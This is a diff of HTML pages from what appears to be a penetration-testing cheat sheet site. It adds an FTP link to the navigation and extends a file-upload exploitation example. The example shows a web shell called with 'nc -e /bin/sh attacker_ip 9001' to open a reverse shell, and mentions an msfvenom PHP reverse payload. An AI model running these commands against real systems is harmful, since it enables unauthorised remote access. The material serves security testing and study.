@@ -1365,6 +1365,29 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ftp-cheat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FTP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -1597,7 +1620,7 @@
 <ul>
 <li><strong>Explanation</strong>: If a file executes, use it for RCE (e.g., reverse shell via <code>msfvenom -p php/reverse_php</code>). Chain with LFI for further exploitation.</li>
 <li><strong>Why It's Done</strong>: Maximizes impact, turning upload into full system access.</li>
-<li><strong>Example</strong>: Upload <code>shell.php</code>, access <code>/uploads/shell.php?cmd=nc -e /bin/sh attacker_ip 9001</code>.</li>
+<li><strong>Example</strong>: Upload <code>shell.php</code>, access <code>/uploads/shell.php?cmd=nc -e /bin/sh attacker_ip 9001</code>, or use FTP (see <a href="../ftp-cheat/">FTP Cheat Sheet</a>) to upload via an open server.</li>
 </ul>
 <h3 id="11-assess-prevention-measures">11. Assess Prevention Measures</h3>
 <ul>
